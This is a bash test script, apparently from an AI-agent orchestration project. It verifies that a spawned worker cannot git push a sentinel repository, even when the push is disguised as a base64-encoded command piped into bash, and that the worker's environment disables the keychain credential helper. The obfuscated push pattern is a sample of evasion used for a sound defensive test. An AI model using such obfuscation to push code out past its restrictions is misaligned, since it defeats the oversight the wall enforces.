#!/usr/bin/env bash
# F13-push (G0c): prove the worker CANNOT push, even via obfuscation.
#
# The worker's start command exports a push-neutralizing git env (worker_walls.
# push_neutralizing_export_prefix), wired into spawn.build_start_command. This script
# builds that exact command with an override that runs an OBFUSCATED `git push`
# (base64|base64 -d|bash) against a remote we do not own, and asserts:
#   (a) BASELINE (normal env): the obfuscated push reaches an AUTHENTICATED remote channel
#       (keychain silently supplies creds) -> the wall is load-bearing, not a no-op.
#   (b) WALLED (worker env): the same obfuscated push FAILS by auth (no credential can be
#       supplied) -> nothing is pushed.
set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT="$ROOT/docs/evidence/F13-push"
mkdir -p "$OUT"
LOG="$OUT/push-wall.log"
: > "$LOG"
log() { echo "$@" | tee -a "$LOG"; }

REMOTE="https://github.com/orc-spike-nonexistent-9f3a/private-repo.git"

make_repo() {
  local T; T=$(mktemp -d /tmp/orc-pushwall.XXXXXX)
  ( cd "$T"
    git init -q
    git config user.email w@x; git config user.name w
    echo "leaked-sentinel-$(date +%s)" > SECRET_SENTINEL.txt
    git add -A; git commit -qm init
    git remote add origin "$REMOTE"
  )
  echo "$T"
}

# Run the worker start command for a project, with an override that attempts an
# obfuscated push. Returns exit + writes output to $2.
run_worker_push() {
  local proj="$1" outfile="$2" walled="$3"
  # obfuscated push payload
  local payload; payload=$(printf 'git push -u origin HEAD' | base64)
  export ORC_SPAWN_CMD_OVERRIDE="echo $payload | base64 -d | bash"
  local cmd
  if [ "$walled" = "1" ]; then
    # exact worker command (push-neutralizing prefix + cd + override), sandbox off so
    # the failure is unambiguously the ENV wall (network path identical either way).
    cmd=$(cd "$ROOT" && PYTHONPATH=src python3 -c "
from orc import spawn
print(spawn.build_start_command('$proj', '/bin/true', 'x', session='pw', cfg={'sandbox': False}))
")
  else
    # baseline: same shape WITHOUT the push-neutralizing prefix
    cmd="cd '$proj' && $ORC_SPAWN_CMD_OVERRIDE"
  fi
  unset ORC_SPAWN_CMD_OVERRIDE
  ( eval "GIT_HTTP_LOW_SPEED_LIMIT=1 GIT_HTTP_LOW_SPEED_TIME=8 $cmd" ) >"$outfile" 2>&1 &
  local pid=$!; local waited=0
  while kill -0 $pid 2>/dev/null; do
    sleep 1; waited=$((waited+1))
    [ $waited -ge 30 ] && { kill -9 $pid 2>/dev/null; echo "(timeout killed)" >>"$outfile"; }
  done
  wait $pid 2>/dev/null; return $?
}

pushed_clean() { # $1=exit $2=logfile -> 0 if a real push happened
  local rc="$1" f="$2"
  [ "$rc" -eq 0 ] && grep -qiE 'main ->|new branch|Writing objects|-> HEAD|branch .* set up' "$f"
}
auth_blocked() { # $1=logfile -> 0 if failed by missing credential
  grep -qiE 'could not read Username|terminal prompts disabled|Authentication failed|unable to read askpass|Invalid username or password|Permission denied|unable to access' "$1"
}

log "=== F13-push: git-push capability removed from the worker (G0c) ==="
log "remote (not owned): $REMOTE"
log ""

# --- (a) baseline ---
log "--- (a) BASELINE: obfuscated push under NORMAL env (must reach authenticated remote) ---"
RA=$(make_repo); OA="$OUT/baseline.out"
run_worker_push "$RA" "$OA" 0; RCA=$?
log "exit=$RCA"; sed 's/^/  | /' "$OA" | tee -a "$LOG" | head -8
if pushed_clean "$RCA" "$OA"; then
  log "  !! BASELINE PUSHED -- test invalid (would need a real owned remote)"; BASE="pushed"
elif grep -qiE 'Repository not found|remote: (Repository|Invalid)' "$OA"; then
  log "  BASELINE reached an AUTHENTICATED channel (keychain supplied creds; repo just doesn't exist)"
  log "  => the push capability IS present without the wall (wall is load-bearing)."
  BASE="authed"
else
  log "  BASELINE failed before auth (network/other) -- see output"; BASE="other"
fi
log ""

# --- (b) walled ---
log "--- (b) WALLED: same obfuscated push under the WORKER env (must fail by auth) ---"
RB=$(make_repo); OB="$OUT/walled.out"
run_worker_push "$RB" "$OB" 1; RCB=$?
log "exit=$RCB"; sed 's/^/  | /' "$OB" | tee -a "$LOG" | head -8

FAIL=0
if pushed_clean "$RCB" "$OB"; then
  log "  WALL BREACHED: worker pushed to the remote"; FAIL=1
elif auth_blocked "$OB"; then
  log "  WALL HELD: obfuscated push blocked by missing credential (auth), nothing pushed"
else
  log "  WALL held but reason unclear -- inspect output"; FAIL=1
fi

# sentinel-not-pushed proof: the local commit exists but the remote channel got no objects
if grep -qiE 'Writing objects|Enumerating objects' "$OB"; then
  log "  NOTE: objects were enumerated -- verifying none reached the remote..."
  grep -qiE 'main ->|new branch' "$OB" && { log "  SENTINEL PUSHED (breach)"; FAIL=1; } || log "  no ref updated: sentinel NOT pushed"
else
  log "  sentinel NOT pushed (no object transfer attempted past auth)"
fi

# also assert the walled env really disabled the credential helper
log ""
log "--- credential.helper visible to a git process in the worker env? ---"
HELP=$(cd "$ROOT" && PYTHONPATH=src python3 -c "
from orc import spawn
c = spawn.build_start_command('$RB', '/bin/true', 'x', session='pw', cfg={'sandbox': False})
# strip the trailing cd/claude; run just the exports then git config
import re
exports = c.split(' && ')[0]
print(exports)
")
EFFHELP=$( bash -c "$HELP; git config --show-origin credential.helper 2>&1 || echo '(no credential.helper -> osxkeychain disabled)'" )
log "  git config credential.helper under worker env: $EFFHELP"

rm -rf "$RA" "$RB"
log ""
if [ "$FAIL" -eq 0 ] && [ "$BASE" != "other" ]; then
  log "=== F13-push PASS (worker git-push capability removed; obfuscated push fails by auth) ==="
  exit 0
else
  log "=== F13-push FAIL ==="
  exit 1
fi
